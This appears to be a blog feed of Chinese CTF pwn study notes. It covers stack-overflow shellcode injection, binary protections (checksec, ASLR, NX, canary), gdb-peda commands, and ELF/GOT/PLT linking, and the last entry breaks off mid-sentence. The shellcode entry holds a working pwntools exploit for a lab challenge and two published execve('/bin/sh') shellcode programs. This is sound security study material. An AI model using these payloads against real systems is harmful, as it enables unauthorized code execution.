            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----shellcode</title>
      <link href="/2020/02/18/ctf/pwn/pwn-shellcode/"/>
      <url>/2020/02/18/ctf/pwn/pwn-shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwn学习-——-shellcode"><a href="#Pwn学习-——-shellcode" class="headerlink" title="Pwn学习   —— shellcode"></a>Pwn学习   —— shellcode</h1><h2 id="0x10-shellcode"><a href="#0x10-shellcode" class="headerlink" title="0x10 shellcode"></a>0x10 shellcode</h2><p><em>－－修改返回地址，让其指向溢出数据中的一段指令</em></p><p>根据上面副标题的说明，要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开 shell，从而可以获得当前进程的控制权，所以这类指令片段也被成为“shellcode”。下面我们先写出溢出数据的组成，再确定对应的各部分填充进去。</p><p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220140.png" alt="图1 payload图解"></p><h2 id="0x20-shellcode-payload"><a href="#0x20-shellcode-payload" class="headerlink" title="0x20 shellcode payload"></a>0x20 shellcode payload</h2><p>padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式。</p><p>根据上面的构造，我们要解决两个问题。</p><ol><li>返回地址之前的填充数据（padding1）应该多长？</li></ol><p>我们可以用调试工具（例如 gdb）查看汇编代码来确定这个距离，也可以在运行程序时用不断增加输入长度的方法来试探（如果返回地址被无效地址例如“AAAA”覆盖，程序会终止并报错）。</p><ol><li>shellcode起始地址应该是多少？</li></ol><p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机），参见前面关于函数状态的解释），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p><p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即Address Space Layout Randomization (ASLR) ），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p><p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220141.png" alt="图2 payload"></p><p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题同样来自于ctf-wiki\challengespwn\stackoverflow\ret2shellcode</p><p>题目源码</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <string.h>char buf2[100];int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("No system for you this time !!!\n");    gets(buf);    strncpy(buf2, buf, 100);//将 buf传给buf2    printf("bye bye ~");    return 0;}</string.h></stdio.h></code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -fno-stack-protector//关闭cannary nx保护</code></pre><p>程序关闭了nx保护这就意味着我们输入栈中的数据变得可以执行</p><p>这也就是说，如果我们输入的是一段汇编指令也会被执行</p><p>在本题中，我们就可以在：</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |     retaddr     |                                           +-----------------+                                           |     saved ebp   |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                            buf,ebp-0xc----&gt;+-----------------+</code></pre><p>那么如果我们读取字符串：</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x6c*'a'+'bbbb'+success_addr//success_addr为我们想要跳转的地址</code></pre><blockquote><p>为什么是0x6c而不是ida里说的0x64？</p></blockquote><p>主要是因为IDA里出来的偏移量并不是每次都是准确的，需要我们用GDB手动来调试（网上是这样说的，我查了一下午，，，）</p><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |  success_addr   |                                           +-----------------+                                           |       bbbb      |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           | 'a'*0x6c        |                                           |                 |                                           |                 |                                           |                 |                              s,ebp-0x64--&gt;+-----------------+</code></pre><p>由于存在strncpy（buf2,buf,100）,因此我们可以把shellcode通过buf写入到buf2中，然后我们知道buf2的地址，即：buf2的地址就是shellcode的起始地址，我们在将返回地址修改为buf2的地址，程序没有开启NX,程序数据中的shellcode可以执行，返回shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *sh=process('./ret2shellcode')#这里使用的是pwntools自带的shellcode生成的，也可以使用网上的#asm(shellcraft.sh()) //将shellcode汇编为汇编代码shellcode=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shellcode.ljust(0x6c+0x4,'a')+p32(buf2_addr)sh.sendafter(""No system for you this time !!!\n"",payload)sh.interactive()</code></pre><h2 id="0x40-shellcode-example-of-32-and-64"><a href="#0x40-shellcode-example-of-32-and-64" class="headerlink" title="0x40 shellcode example of 32 and 64"></a>0x40 shellcode example of 32 and 64</h2><p>shellcode32:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/* -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes ------------------------- *  AUTHOR : Tosh *   OS    : BSDx86 (Tested on FreeBSD 8.1) *   EMAIL : tosh@tuxfamily.org */#include <string.h>#include <stdio.h>char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"                   "\x54\x53\xb0\x3b\x50\xcd\x80";int main(void){   void(*f)() = (void*)shellcode;   printf("Len = %d\n", sizeof(shellcode)-1);   f();}/*! %define SYS_EXECV 59section .textglobal _start_start:   xor eax, eax   push eax   push '//sh'   push '/bin'   mov ebx, esp   push eax   push esp   push ebx   mov al, SYS_EXECV   push eax   int 0x80*/</stdio.h></string.h></code></pre><p>shellcode64:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/**  * *   _   _            _            ____       _ _  *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | | *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | | *  |  _  | (_| | (__|   &lt;| | | | |  _ &lt; (_) | | | *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_| *           [ http://www.hacknroll.com ] * * Description: *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes * * * * Authors: *    Maycon M. Vitali ( 0ut0fBound ) *        Milw0rm .: http://www.milw0rm.com/author/869 *        Page ....: http://maycon.hacknroll.com *        Email ...: maycon@hacknroll.com * *    Anderson Eduardo ( c0d3_z3r0 ) *        Milw0rm .: http://www.milw0rm.com/author/1570 *        Page ....: http://anderson.hacknroll.com *        Email ...: anderson@hacknroll.com *  * ------------------------------------------------------- *    * amd64# gcc hacknroll.c -o hacknroll * amd64# ./hacknroll * # exit * amd64# * * ------------------------------------------------------- */const char shellcode[] =        "\x48\x31\xc0"                               // xor    %rax,%rax        "\x99"                                       // cltd        "\xb0\x3b"                                   // mov    $0x3b,%al        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi        "\x57"                                       // push   %rdi        "\x48\x89\xe7"                               // mov    %rsp,%rdi        "\x57"                                       // push   %rdi        "\x52"                                       // push   %rdx        "\x48\x89\xe6"                               // mov    %rsp,%rsi        "\x0f\x05";                                  // syscallint main(void){        (*(void (*)()) shellcode)();        return 0;}</code></pre><p>shellcodeDB: <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p><h2 id="0x50-shellcode64位汇编指令解析"><a href="#0x50-shellcode64位汇编指令解析" class="headerlink" title="0x50 shellcode64位汇编指令解析"></a>0x50 shellcode64位汇编指令解析</h2><p>前置知识</p><p>64位函数参数传递方式：<a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p><pre class=" language-lang-txt"><code class="language-lang-txt">_start:    xor rax,rax        ;clear rax    add rax,0x3b    ;syscall_64.tbl    xor rdi,rdi        ;clear rdi    push rdi    mov rdi,0x68732f26e69622f    ;hs//nib/==&gt;bin/sh写入rdi    push rdi        ;push stark(rsp-=8) 现在rsp==&gt;bin/sh    lea rdi,[rsp]    ;rdi=rsp(%rdi,%rsi,%rdx,%rcx,%r8,%r9用作函数参数，依次对应第一、第二参数)取bin/sh的地址放到rdi里    xor rsi,rsi        ;clear rsi    xor rdx,rdx        ;clear rdx    syscall</code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序，elf64指定文件类型ld -s -o shasm shasm.o  链接目标文件objcopy -O binary shasm.o.code 提取其中的shellcode部分xxd code 显示方便</code></pre><h2 id="0x60-pwntoos-shellcraft-sh"><a href="#0x60-pwntoos-shellcraft-sh" class="headerlink" title="0x60 pwntoos shellcraft.sh()"></a>0x60 pwntoos shellcraft.sh()</h2><pre class=" language-lang-txt"><code class="language-lang-txt">/* execve(path='/bin///sh', argv=['sh'], envp=0) */    /* push '/bin///sh\x00' */ ==&gt;0x68732f26e69622f    push 0x68    push 0x732f2f2f    push 0x6e69622f            mov ebx, esp    /* push argument array ['sh\x00'] */    /* push 'sh\x00\x00' */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* 'sh\x00' */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80</code></pre><p>int 0x80在linux中用来处理system_call,int表示中断，数字0x80是中断号。 中断将程序stream传送给正在处理该中断的人，在这种情况下，中断为0x80。 在Linux中，0x80中断处理程序是内核，用于由其他程序对内核进行系统调用.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----保护机制(checksec)</title>
      <link href="/2020/02/18/ctf/pwn/pwn-basic/"/>
      <url>/2020/02/18/ctf/pwn/pwn-basic/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN学习记录"><a href="#PWN学习记录" class="headerlink" title="PWN学习记录"></a>PWN学习记录</h1><h2 id="CTF中pwn的保护机制（常见的）"><a href="#CTF中pwn的保护机制（常见的）" class="headerlink" title="CTF中pwn的保护机制（常见的）"></a>CTF中pwn的保护机制（常见的）</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200203234407.png" alt=""></p><p>GCC编译时保护的开关：</p><ol><li>NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息</li><li>PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限</li></ol><h3 id="ARCH"><a href="#ARCH" class="headerlink" title="ARCH"></a>ARCH</h3><p>Arch:     amd64-64-little  —    文件类型</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO:    Full RELRO   — 重定向 RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无    法修改got表</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="CANNARY-栈保护）"><a href="#CANNARY-栈保护）" class="headerlink" title="CANNARY(栈保护）"></a>CANNARY(栈保护）</h3><p>Stack:    No canary found   — 栈检查，如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</p><p>这个选项表示栈保护功能有没有开启。</p><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -fno-stack-protector -o test test.c  //禁用栈保护gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</code></pre><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX:       NX enabled    — 不可执行， 如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -o test test.c</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE:      PIE enabled   — 地址随机化，如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址</p><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><pre class=" language-lang-txt"><code class="language-lang-txt">0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>liunx下关闭PIE的命令如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><h2 id="GDB-peda的基本调试命令"><a href="#GDB-peda的基本调试命令" class="headerlink" title="GDB-peda的基本调试命令"></a>GDB-peda的基本调试命令</h2><pre class=" language-lang-txt"><code class="language-lang-txt">peda的一个实用命令checksec检测安全保护。peda的另一个实用命令searchmem用搜索内存file 路径　　附加文件r   　　　　开始执行c              继续执行step          单步步入next          单步步过b *地址　　下断点enable       激活断点disable      禁用断点info b        查看断点del num     删除断点x/wx $esp 　　以4字节16进制显示栈中内容stack 100　　  插件提供的，显示栈中100项 find xxx　　   快速查找，很实用s 按字符串输出x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。f 按浮点数格式显示变量。x/<n f="" u=""> <addr>n、f、u是可选的参数。b表示单字节，h表示双字节，w表示四字 节，g表示八字节但是实际的组合就那么几种：x/s 地址　　查看字符串x/wx 地址　　查看DWORDx/c 地址　　单字节查看x/16x $esp+12 查看寄存器偏移set args 可指定运行时参数。（如：set args 10 20 30 40 50）show args 命令可以查看设置好的运行参数。peda的教程增强gdb的显示：在调试过程中着色并显示反汇编代码，寄存器和内存信息。添加命令以支持调试和利用开发（有关命令使用的完整列表peda help）：aslr - 显示/设置GDB的ASLR设置checksec - 检查二进制文件的各种安全选项dumpargs - 在呼叫指令处停止时显示传递给函数的参数dumprop - 将特定内存范围内的所有ROP小工具转储elfheader - 从被调试的ELF文件中获取标题信息elfsymbol - 从ELF文件获取非调试符号信息lookup - 搜索所有地址/参考地址属于一个内存范围patch - 修补程序内存以string / hexstring / int的地址开始pattern - 生成，搜索或写入循环模式到内存procinfo - 显示/ proc / pid /pshow - 显示各种PEDA选项和其他设置pset - 设置各种PEDA选项和其他设置readelf - 从ELF文件获取标题信息ropgadget - 获取二进制或库的通用ROP小工具ropsearch - 在内存中搜索ROP小工具searchmem|find - 在内存中搜索模式; 支持正则表达式搜索//查找用，例如searchmem“/ bin / sh”libcshellcode - 生成或下载常用的shellcode。skeleton - 生成python漏洞利用代码模板vmmap -- Get virtual mapping address ranges of section(s) in debugged process  //可以用来查看栈、bss段是否可以执行xormem - 用一个键异或存储区域</addr></n></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">info file  // 查看当前文件的信息，例如程序入口点info break // 查看当前断点信息disassemble + func // 对指定的函数进行反汇编break +''地址''  // 设置断点r(run)  // 运行程序c(contunue)  // 继续执行x / (n , f ,u) // n,f,u是其三个可选参数  n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。  f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i。  u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。layout // 用于分割窗口，可以一边查看代码，一边测试。主要有下面几种用法：layout src // 显示源代码窗口layout asm // 显示汇编窗口layout regs // 显示源代码/汇编和寄存器窗口layout split // 显示源代码和汇编窗口layout next // 显示下一个layoutlayout prev // 显示上一个layoutCtrl + L // 刷新窗口Ctrl + x  再按1 // 单窗口模式，显示一个窗口Ctrl + x  再按2 // 双窗口模式，显示两个窗口Ctrl + x  再按a // 回到传统模式，即退出layout，回到执行layout之前的调试窗口。</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ELF文件基础</title>
      <link href="/2020/02/18/ctf/pwn/linux-elf/"/>
      <url>/2020/02/18/ctf/pwn/linux-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ELF文件基本常识了解"><a href="#Linux-ELF文件基本常识了解" class="headerlink" title="Linux-ELF文件基本常识了解"></a>Linux-ELF文件基本常识了解</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇参考 <a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlow之Ret2libc详解</a> 并使用了其部分内容，在此表示感谢</p><h2 id="0x10-目标文件格式"><a href="#0x10-目标文件格式" class="headerlink" title="0x10 目标文件格式"></a>0x10 目标文件格式</h2><pre class=" language-lang-txt"><code class="language-lang-txt">ELF（Executable Linkable Format ---- 即可执行链接格式），Windows下为PE（Portable Executable ----可移植可执行文件）。它们都是COFF（Common Format ---- 通用文件格式）格式的变种Linux下我们将目标文件与可执行文件统称为ELF文件， 动态链接库（DLL, Dynamic Linking Library 例如：linux下的.so文件）与静态链接库（Static Linking Library 例如：linux下的.a文件）文件都按照</code></pre><div class="table-container"><table><thead><tr><th style="text-align:left">ELF文件类型</th><th style="text-align:left">说明</th><th style="text-align:center">实例</th></tr></thead><tbody><tr><td style="text-align:left">可重定位文件（Relocatable File）</td><td style="text-align:left">这类文件包含了代码和数据，可以用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类</td><td style="text-align:center">linux 的.o文件</td></tr><tr><td style="text-align:left">可执行文件（Executable File）</td><td style="text-align:left">这类文件包含了可以直接执行的程序，它的代表就是ELF可执行文件，他们一般都没有扩展名</td><td style="text-align:center">比如/bin/bash 文件</td></tr><tr><td style="text-align:left">共享目标文件（Share Object File）</td><td style="text-align:left">这种文件包含了代码和数据，可以在以下两种情况下使用。一种是链接器可以使用这种文件跟其它的可从定位文件和共享目标文件链接，产生显得目标文件。第二种是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td><td style="text-align:center">linux 的.so，如：/lib/glibc-2.5.so</td></tr><tr><td style="text-align:left">核心转储文件（Core Dump File）</td><td style="text-align:left">当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其它信息转储到核心转储文件</td><td style="text-align:center">linux 下的 core dump</td></tr></tbody></table></div><p>linux 下file命令可以查看文件的属性：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ file ret2libc3ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>ELF 32-bit LSB executable //32位可执行文件</p><p>Intel 80386 //Intel版本号</p><p>dynamically linked //动态链接文件</p><h2 id="0x20-GOT（Global-offset-Table）"><a href="#0x20-GOT（Global-offset-Table）" class="headerlink" title="0x20 GOT（Global offset Table）"></a>0x20 GOT（Global offset Table）</h2><p>全局偏移表. 这是链接器在执行链接时<br>实际上要填充的部分, 保存了所有外部符号的地址信息.<br>不过值得注意的是, 在i386架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了<br>3个公共表项, 每项32位(4字节), 保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址</li><li>got[1]: 本ELF的<code>link_map</code>数据结构描述符地址</li><li>got[2]: <code>_dl_runtime_resolve</code>函数的地址</li></ul><p>其中, <code>link_map</code>数据结构的定义如下:</p><pre class=" language-lang-C"><code class="language-lang-C">struct link_map{   /* Shared library's load address. */   ElfW(Addr) l_addr;                    /* Pointer to library's name in the string table. */                                    char *l_name;       /*         Dynamic section of the shared object.        Includes dynamic linking info etc.        Not interesting to us.     */                      ElfW(Dyn) *l_ld;      /* Pointer to previous and next link_map node. */                    struct link_map *l_next, *l_prev;   };</code></pre><h2 id="0x30-DLL-Dynamic-linking"><a href="#0x30-DLL-Dynamic-linking" class="headerlink" title="0x30 DLL (Dynamic linking)"></a>0x30 DLL (Dynamic linking)</h2><p><strong>动态链接</strong> 是指在程序装载时通过 <strong>动态链接器</strong> 将程序所需的所有 <strong>动态链接库(Dynamic linking library)</strong> 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。它诞生的最主要的的原因就是 <strong>静态链接</strong> 太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在 <strong>静态链接</strong> 的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过 <strong>动态链接</strong> 的方式就推迟这个链接过程到了程序运行时进行。这样做有以下几点好处：</p><p>1、节省内存、磁盘空间</p><p>例如磁盘中有两个程序，p1、p2，且他们两个都包含 lib.o 这个模块，在 <strong>静态链接</strong> 的情况下他们在链接输出可执行文件时都会包含 lib.o 这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似 lib.o 这种被多个程序共享的模块时，也就会造成很大空间的浪费。在 <strong>动态链接</strong> 的情况下，运行 p1 ，当系统发现需要用到 lib.o ，就会接着加载 lib.o 。这时我们运行 p2 ，就不需要重新加载 lib.o 了，因为此时 lib.o 已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个 lib.o 节省了内存空间。</p><p>2、程序更新更简单</p><p>比如程序 p1 所使用的 lib.o 是由第三方提供的，等到第三方更新、或者为 lib.o 打补丁的时候，p1 就需要拿到第三方最新更新的 lib.o ，重新链接后在将其发布给用户。程序依赖的模块越多，就越发显得不方便，毕竟都是从网络上获取新资源。在 <strong>动态链接</strong> 的情况下，第三方更新 lib.o 后，理论上只需要覆盖掉原有的 lib.o ，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</p><p>3、增强程序扩展性和兼容性</p><p><strong>动态链接</strong> 的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的动态链接文件，以此来实现程序功能的扩展。增强兼容性是表现在 <strong>动态链接</strong> 的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是 <strong>静态链接</strong> 的程序会为不同平台发布不同的版本，而在 <strong>动态链接</strong> 的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。</p><p>总而言之，<strong>动态链接</strong> 的程序在运行时会根据自己所依赖的 <strong>动态链接库</strong> ，通过 <strong>动态链接器</strong> 将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux 系统中，<strong>ELF</strong> 动态链接文件被称为 <strong>动态共享对象（Dynamic Shared Objects）</strong> ， 简称 <strong>共享对象</strong> 一般都是以 “.so” 为扩展名的文件；在 windows 系统中就是常常软件报错缺少 xxx.dll 文件。</p><h2 id="0x40-延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#0x40-延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="0x40 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>0x40 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h2><p>因为 <strong>动态链接</strong> 的程序是在运行时需要对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再才间接跳转，这么做势必会影响到程序的运行速度。而且程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的 <strong>延迟绑定</strong>。ELF实现 <strong>延迟绑定</strong> 是通过 <strong>PLT</strong> ，原先 <strong>GOT</strong> 中存放着全局变量和函数调用，现在把他拆成另个部分 .got 和 .got.plt，用 .got 存放着全局变量引用，用 .got.plt 存放着函数引用。查看 test@plt 代码，用 objdump -Mintel -d -j .plt got</p><blockquote><p>-Mintel 选项指定 intel 汇编语法<br>-d 选项展示可执行文件节的汇编形式<br>-j 选项后面跟上节名，指定节</p></blockquote><pre class=" language-lang-txt"><code class="language-lang-txt">00001060 <test@plt>:    1060:    ff a3 14 00 00 00        jmp    DWORD PTR [ebx+0x14]    1066:    68 10 00 00 00           push   0x10    106b:    e9 c0 ff ff ff           jmp    1030 &lt;.plt&gt;</test@plt></code></pre><p>查看 main()函数 中调用 test@plt 的反汇编代码</p><pre class=" language-lang-txt"><code class="language-lang-txt">    11ee:    e8 cd fe ff ff           call   10c0 &lt;__x86.get_pc_thunk.bx&gt;    11f3:    81 c3 0d 2e 00 00        add    ebx,0x2e0d    11f9:    e8 bb ff ff ff           call   11b9 <fun>    11fe:    e8 5d fe ff ff           call   1060 <test@plt></test@plt></fun></code></pre><p><strong>x86.gett_pc_thunk.bx 函数与之前的 </strong>x86.get_pc_thunk.ax 功能一样 ，得出 ebx = 0x11f3 + 0x2e0d = 0×4000 ，ebx + 0×14 = 0×4014 。首先 jmp 指令，跳转到 0×4014 这个地址，这个地址在 .got.plt 节中 ：</p><p><a href="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png!small" alt=".got.plt."></a></p><p>也就是当程序需要调用到其他模块中的函数时例如 fun() 